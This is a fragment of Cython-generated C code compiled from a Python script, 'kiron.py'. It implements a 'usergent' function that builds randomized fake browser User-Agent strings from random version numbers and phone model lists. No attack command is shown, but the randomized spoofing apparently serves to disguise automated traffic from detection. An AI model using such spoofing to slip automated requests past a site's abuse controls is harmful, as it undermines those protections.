  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_v_mobile); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_Build);
  __pyx_t_6 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_Build);
  PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u_Build);
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_v_bbbb); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3);
  __pyx_t_6 += 48;
  __Pyx_GIVEREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3);
  PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3);
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_v_chorom); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 7, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_Safari);
  __pyx_t_6 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_Safari);
  PyTuple_SET_ITEM(__pyx_t_3, 8, __pyx_kp_u_Safari);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_rr); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__55, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 9, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_3, 10, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_3, 11, __pyx_t_4);
  __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_3, 12, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_cudiua7 = ((PyObject*)__pyx_t_4);
  __pyx_t_4 = 0;

  /* "kiron.py":354
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"             # <<<<<<<<<<<<<<
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 *      return ua
 */
  __pyx_t_4 = __Pyx_PyObject_Str(__pyx_v_mobile); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = PyNumber_Add(__pyx_kp_u_Mozilla_5_0_Linux_U_Android_13_p, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyTuple_New(10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u_AppleWebKit_534_30_KHTML_like_G);
  __pyx_t_6 += 49;
  __Pyx_GIVEREF(__pyx_kp_u_AppleWebKit_534_30_KHTML_like_G);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_AppleWebKit_534_30_KHTML_like_G);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_0);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_0);
  PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_0);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_4, 5, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_Mobile_Safari);
  __pyx_t_6 += 15;
  __Pyx_GIVEREF(__pyx_kp_u_Mobile_Safari);
  PyTuple_SET_ITEM(__pyx_t_4, 6, __pyx_kp_u_Mobile_Safari);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__55, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_4, 7, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__11);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__11);
  PyTuple_SET_ITEM(__pyx_t_4, 8, __pyx_kp_u__11);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_rr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_4, 9, __pyx_t_1);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_4, 10, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyNumber_Add(__pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_cudiua8 = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "kiron.py":355
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])             # <<<<<<<<<<<<<<
 *      return ua
 * def rnd():
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyList_New(8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_v_cudiua1);
  __Pyx_GIVEREF(__pyx_v_cudiua1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 0, __pyx_v_cudiua1)) __PYX_ERR(0, 355, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_cudiua2);
  __Pyx_GIVEREF(__pyx_v_cudiua2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 1, __pyx_v_cudiua2)) __PYX_ERR(0, 355, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_cudiua3);
  __Pyx_GIVEREF(__pyx_v_cudiua3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 2, __pyx_v_cudiua3)) __PYX_ERR(0, 355, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_cudiua4);
  __Pyx_GIVEREF(__pyx_v_cudiua4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 3, __pyx_v_cudiua4)) __PYX_ERR(0, 355, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_cudiua5);
  __Pyx_GIVEREF(__pyx_v_cudiua5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 4, __pyx_v_cudiua5)) __PYX_ERR(0, 355, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_cudiua6);
  __Pyx_GIVEREF(__pyx_v_cudiua6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 5, __pyx_v_cudiua6)) __PYX_ERR(0, 355, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_cudiua7);
  __Pyx_GIVEREF(__pyx_v_cudiua7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 6, __pyx_v_cudiua7)) __PYX_ERR(0, 355, __pyx_L1_error);
  __Pyx_INCREF(__pyx_v_cudiua8);
  __Pyx_GIVEREF(__pyx_v_cudiua8);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_1, 7, __pyx_v_cudiua8)) __PYX_ERR(0, 355, __pyx_L1_error);
  __pyx_t_2 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_1};
    __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 355, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_v_ua = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "kiron.py":356
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 *      return ua             # <<<<<<<<<<<<<<
 * def rnd():
 *     clear()
 */
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_ua);
  __pyx_r = __pyx_v_ua;
  goto __pyx_L0;

  /* "kiron.py":335
 * open('.mod.txt','w').write(resrr)
 * moe = open('.mod.txt','r').read().splitlines()
 * def usergent():             # <<<<<<<<<<<<<<
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
 */

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("kiron.usergent", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_motorola);
  __Pyx_XDECREF(__pyx_v_mmp);
  __Pyx_XDECREF(__pyx_v_mmm);
  __Pyx_XDECREF(__pyx_v_bbbb);
  __Pyx_XDECREF(__pyx_v_kkkkki);
  __Pyx_XDECREF(__pyx_v_mmmmm);
  __Pyx_XDECREF(__pyx_v_mmmm);
  __Pyx_XDECREF(__pyx_v_cph);
  __Pyx_XDECREF(__pyx_v_chorom);
  __Pyx_XDECREF(__pyx_v_br_virshon);
  __Pyx_XDECREF(__pyx_v_mobile);
  __Pyx_XDECREF(__pyx_v_cudiua1);
  __Pyx_XDECREF(__pyx_v_cudiua2);
  __Pyx_XDECREF(__pyx_v_cudiua3);
  __Pyx_XDECREF(__pyx_v_cudiua4);
  __Pyx_XDECREF(__pyx_v_cudiua5);
  __Pyx_XDECREF(__pyx_v_cudiua6);
  __Pyx_XDECREF(__pyx_v_cudiua7);
  __Pyx_XDECREF(__pyx_v_cudiua8);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

